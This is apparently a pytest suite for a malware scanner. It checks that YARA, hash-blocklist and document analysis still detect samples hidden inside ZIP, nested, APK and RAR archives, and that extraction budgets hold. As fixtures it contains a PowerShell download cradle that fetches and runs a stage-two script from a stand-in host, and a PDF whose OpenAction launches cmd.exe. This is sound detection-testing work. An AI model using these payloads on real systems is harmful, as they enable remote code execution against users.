"""Detection INSIDE archives, as opposed to survival against hostile ones.

test_archive_attacks.py proves a malicious archive cannot hurt the scanner.
This file proves the opposite direction: that a sample hidden inside an archive
is still found. Those had been separate concerns, and only the first was covered.

The gap these lock shut was silent. Extraction ran, IOCs from inner files were
merged, the report listed the contents — everything looked like it worked. But
the identity detectors were all pointed at the container: YARA scanned the ZIP's
DEFLATE-compressed bytes, document analysis saw "a ZIP" instead of the maldoc
inside it, and both hash checks knew only the wrapper's hash. Zipping a sample
disabled three engines at once without failing a single existing test.

The YARA rules make this concrete. Every rule is file-type gated (see the header
of common_threats.yar), and the PowerShell rules require `IsScriptOrText`, which
is defined as *not* ZIP. So a PowerShell dropper inside a ZIP could never match
while only the container was scanned — not because the rule was wrong, but
because it was being shown the wrong bytes.
"""

import hashlib
import io
import zipfile

import pytest

from app import main as app_main

# Trips PowerShell_DownloadCradle (severity critical): needs IsScriptOrText plus
# two of the download-cradle strings. Contains three — Net.WebClient,
# DownloadString and IEX( — so it cannot pass on a single-string coincidence.
PS_DROPPER = (
    b"$c = New-Object Net.WebClient\r\n"
    b"IEX($c.DownloadString('http://ps-dropper-probe.example/stage2.ps1'))\r\n"
)

@pytest.fixture
def blocklisted(monkeypatch):
    """Registers a benign payload in the known-hash blocklist for one test.

    EICAR would be the natural fixture here and deliberately is not: real-time
    antivirus quarantines it in the moment between extraction and analysis, so
    the test would fail on a developer's Windows box for a reason that has
    nothing to do with the behaviour under test (verified — the write succeeds
    and the read back is denied). Injecting a hash exercises the identical
    lookup with content nothing will confiscate.
    """
    from attribution_module import scoring

    def _register(payload: bytes):
        sha = hashlib.sha256(payload).hexdigest()
        monkeypatch.setitem(scoring.KNOWN_MALICIOUS_HASHES, sha, {
            "score": 100,
            "family": "Test-Blocklist-Sample",
            "attribution": "Unattributed",
            "reason": "Known malicious test sample detected by SHA-256 hash.",
        })
        return payload, sha

    return _register


def _zip(members: dict, compress=zipfile.ZIP_DEFLATED) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compress) as z:
        for name, payload in members.items():
            z.writestr(name, payload)
    return buf.getvalue()


def _scan(client, payload: bytes, filename: str) -> dict:
    res = client.post("/upload", files={"file": (filename, io.BytesIO(payload), "application/octet-stream")})
    assert res.status_code == 200, res.text
    status = client.get(f"/status/{res.json()['job_id']}").json()
    assert status["status"] == "Completed"
    return status["results"]


def _points(results: dict, label: str) -> int:
    for entry in results.get("score_breakdown") or []:
        if entry["label"] == label:
            return entry["points"]
    return 0


def _members(results: dict) -> list:
    return results.get("archive_contents") or []


# ── YARA reaches inside ───────────────────────────────────────────────────────

def test_yara_matches_a_dropper_inside_a_zip(client):
    """The headline case: a rule that can only match unwrapped content.

    PowerShell_DownloadCradle is gated on IsScriptOrText, so scanning the
    container could never fire it however obvious the payload. If this returns
    to zero, per-member scanning has been lost.
    """
    results = _scan(client, _zip({"invoice.ps1": PS_DROPPER, "readme.txt": b"nothing"}), "delivery.zip")

    assert _points(results, "YARA Rule Matches") > 0, (
        f"YARA scored nothing on a zipped dropper: {results.get('reasons')}"
    )
    assert results["verdict"] in ("Suspicious", "Malicious")


def test_yara_hit_names_the_member_it_fired_on(client):
    """A verdict that cannot say WHICH file is bad is not forensics."""
    results = _scan(client, _zip({"a.txt": b"clean", "payload.ps1": PS_DROPPER}), "attributed.zip")

    guilty = [m for m in _members(results) if m.get("yara_rules")]
    assert guilty, "no member carried its YARA rule names"
    assert guilty[0]["name"] == "payload.ps1"
    assert "PowerShell_DownloadCradle" in guilty[0]["yara_rules"]


def test_repeated_payload_does_not_multiply_the_yara_score(client):
    """Scoring charges 40 per critical match, so duplicates must be collapsed.

    An archive holding twelve copies of one dropper is not twelve times the
    evidence — without dedupe by rule it would score 480 (capped 100) where a
    single copy scores 40, and any archive with repeats would pin to Malicious.
    """
    one = _scan(client, _zip({"only.ps1": PS_DROPPER}), "single.zip")
    many = _scan(client, _zip({f"copy{i}.ps1": PS_DROPPER for i in range(12)}), "twelve.zip")

    assert _points(many, "YARA Rule Matches") == _points(one, "YARA Rule Matches"), (
        "duplicate members inflated the YARA score"
    )
    # …but attribution is not lost to the dedupe.
    assert len([m for m in _members(many) if m.get("yara_rules")]) == 12


# ── Hash intel reaches inside ─────────────────────────────────────────────────

def test_known_sample_zipped_is_matched_on_the_member_hash(client, blocklisted):
    """The internal blocklist keys on a sample's hash, never on its wrapper's."""
    payload, _ = blocklisted(b"stand-in for a known-malicious sample")
    results = _scan(client, _zip({"harmless-invoice.txt": payload}), "known-inside.zip")

    assert _points(results, "Known Malicious Hash Match") > 0, (
        f"a known-malicious sample survived being zipped: {results.get('reasons')}"
    )
    assert results["verdict"] == "Malicious"
    assert results["family"] == "Test-Blocklist-Sample"
    assert any("harmless-invoice.txt" in r for r in results["reasons"]), \
        "the reason did not name the member the hash matched"


def test_double_zipping_does_not_hide_a_known_sample(client, blocklisted):
    """Nesting is a one-line evasion, so depth must not be the escape hatch."""
    payload, _ = blocklisted(b"stand-in sample, buried two layers down")
    inner = _zip({"payload.txt": payload})
    results = _scan(client, _zip({"stage1.zip": inner}), "nested-known.zip")

    assert _points(results, "Known Malicious Hash Match") > 0, "double-zipping hid the sample"
    assert results["verdict"] == "Malicious"


def test_a_member_that_cannot_be_read_is_reported_not_silently_skipped(client, tmp_path):
    """Antivirus quarantines a malicious member between extraction and analysis.

    Discovered the honest way: this suite's own EICAR fixtures extracted fine and
    then failed to open, because Defender took them in the gap. Every analyser
    then returned nothing, which is indistinguishable from a clean file — so the
    single most dangerous member of an archive would be the one reporting least.
    A directory stands in for the quarantined file: open() refuses it on every
    platform, which is exactly the failure shape.
    """
    acc = app_main._new_archive_scan()
    victim = tmp_path / "quarantined.bin"
    victim.mkdir()

    app_main._analyze_archive_member(str(victim), "quarantined.bin", acc, 1)

    assert acc["unreadable"] == ["quarantined.bin"]
    entry = next(m for m in acc["contents"] if m["name"] == "quarantined.bin")
    assert entry.get("unreadable"), "unreadable member was recorded as if it had been analysed"


def test_member_sha256_is_recorded_for_pivoting(client):
    """Each member's own hash is the thing an analyst pivots on elsewhere."""
    body = b"a specific inner file worth hashing"
    results = _scan(client, _zip({"inner.bin": body}), "hashes.zip")

    entry = next(m for m in _members(results) if m["name"] == "inner.bin")
    assert entry["sha256"] == hashlib.sha256(body).hexdigest()


# ── Documents and nesting ─────────────────────────────────────────────────────

def test_maldoc_inside_a_zip_is_analyzed_as_a_document(client):
    """analyze_document on a ZIP finds a ZIP. The maldoc is one level down.

    A /Launch action is the heaviest single PDF signal in scoring (+45); zipped,
    it previously contributed nothing at all.
    """
    pdf = (b"%PDF-1.4\n1 0 obj<</Type/Catalog/OpenAction<</S/Launch"
           b"/F(cmd.exe)>>>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF")
    results = _scan(client, _zip({"statement.pdf": pdf}), "maldoc.zip")

    assert _points(results, "Document Threat Analysis") > 0, (
        f"a zipped maldoc scored nothing: {results.get('reasons')}"
    )
    assert (results.get("document_info") or {}).get("source_file") == "statement.pdf"


def test_nested_members_are_listed_with_their_depth(client):
    """The report has to distinguish a nested payload from a top-level one."""
    inner = _zip({"deep-payload.ps1": PS_DROPPER})
    results = _scan(client, _zip({"outer.zip": inner, "note.txt": b"hi"}), "depth.zip")

    deep = [m for m in _members(results) if m["name"] == "deep-payload.ps1"]
    assert deep, "nested member was never analysed"
    assert deep[0]["depth"] == 2


def test_recursion_stops_at_the_depth_limit(client, monkeypatch):
    """Depth is bounded, and the bound is observable rather than incidental."""
    monkeypatch.setattr(app_main, "MAX_ARCHIVE_DEPTH", 2)

    blob = _zip({"bottom.txt": b"deepest payload"})
    for level in range(4):
        blob = _zip({f"layer{level}.zip": blob})

    results = _scan(client, blob, "toodeep.zip")
    assert max((m.get("depth", 1) for m in _members(results)), default=0) <= 2


def test_nested_archives_share_one_file_budget(client, monkeypatch):
    """Per-archive budgets multiply under nesting; one shared budget does not.

    With per-archive accounting, 5 archives of 5 files each is 25 extractions and
    every one is "within the limit of 5". This is the amplification that makes a
    nested bomb cheap to build, so the budget has to be spent globally.
    """
    monkeypatch.setattr(app_main, "MAX_ZIP_FILE_COUNT", 6)

    inner = _zip({f"i{i}.txt": b"x" * 32 for i in range(5)})
    outer = _zip({f"n{j}.zip": inner for j in range(5)})

    results = _scan(client, outer, "amplified.zip")
    assert len(_members(results)) <= 6, (
        f"nesting multiplied the file budget: {len(_members(results))} members extracted"
    )


def test_oversized_member_cannot_outrun_a_lying_header(client, monkeypatch):
    """The copy itself is capped, not just the header's prediction of it.

    A member may declare a small size and expand far past it. Trusting the
    header means the bomb is on disk before the total is noticed.
    """
    monkeypatch.setattr(app_main, "MAX_DECOMPRESSED_BYTES", 64 * 1024)

    results = _scan(client, _zip({"big.bin": b"B" * (512 * 1024), "small.txt": b"x"}), "overrun.zip")
    total = sum(m.get("size", 0) for m in _members(results))
    assert total <= 64 * 1024, f"wrote {total} bytes against a 64 KB budget"


# ── Other container types get the same treatment ──────────────────────────────

def test_apk_contents_are_walked_not_just_manifest_parsed(client):
    """APKs were excluded from extraction entirely, so a bundled payload was
    invisible: analyze_apk reads the manifest and DEX strings, and nothing else
    looked at the other 99% of the archive."""
    apk = _zip({
        "AndroidManifest.xml": b"\x03\x00\x08\x00 fake binary manifest",
        "classes.dex": b"dex\n035\x00 stub",
        "assets/dropper.ps1": PS_DROPPER,
    })
    results = _scan(client, apk, "bundle.apk")

    names = [m["name"] for m in _members(results)]
    assert "assets/dropper.ps1" in names, "APK contents were not walked"
    assert _points(results, "YARA Rule Matches") > 0, "a payload bundled in an APK was not scanned"


@pytest.mark.skipif(not app_main.RAR_ENABLED, reason="no RAR extraction backend installed")
def test_rar_members_get_the_same_detection_as_zip(client):
    """Same walk, so RAR must not be a second-class path."""
    from tests.test_api import _build_rar

    rar = _build_rar("dropper.ps1", PS_DROPPER)
    results = _scan(client, rar, "delivery.rar")

    assert _points(results, "YARA Rule Matches") > 0, "RAR members were not scanned with YARA"


# ── The container's own findings are not lost ─────────────────────────────────

def test_container_yara_match_is_kept_alongside_member_matches(client):
    """Merging must be additive: a rule that fires on the archive ITSELF (e.g. a
    packer signature on the wrapper) has to survive the member merge."""
    results = _scan(client, _zip({"x.ps1": PS_DROPPER}), "merge.zip")
    rules = {r for m in _members(results) for r in (m.get("yara_rules") or [])}
    assert "PowerShell_DownloadCradle" in rules
    # Nothing about merging should have disturbed the ordinary IOC path.
    assert any("ps-dropper-probe.example" in u for u in results["indicators"]["urls"]), \
        "member IOCs stopped being merged into the parent"
